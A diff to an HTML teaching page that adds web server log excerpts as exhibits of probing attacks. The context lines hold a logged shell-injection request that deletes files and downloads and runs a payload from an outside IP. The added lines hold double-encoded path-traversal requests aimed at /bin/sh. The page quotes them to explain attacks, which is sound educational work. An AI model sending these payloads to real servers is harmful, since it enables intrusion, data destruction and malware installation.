@@ -31,6 +31,10 @@
             </p>
             <p>Exhibit A: (appears to be an attempt at shell command injection)</p>
             <pre><code>125.71.237.92 - - [09/Aug/2025:00:47:06 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws" 400 483 "-" "-"</code></pre>
+            <p>Exhibit B: (AlephOne strikes again?)</p>
+            <pre><code>185.50.38.233 - - [14/Aug/2025:05:19:46 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 473 "-" "libredtail-http"
+
+185.50.38.233 - - [14/Aug/2025:05:19:48 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 473 "-" "libredtail-http"</code></pre>
         </section>
         <section id="homework">
             <h2>Homework</h2>
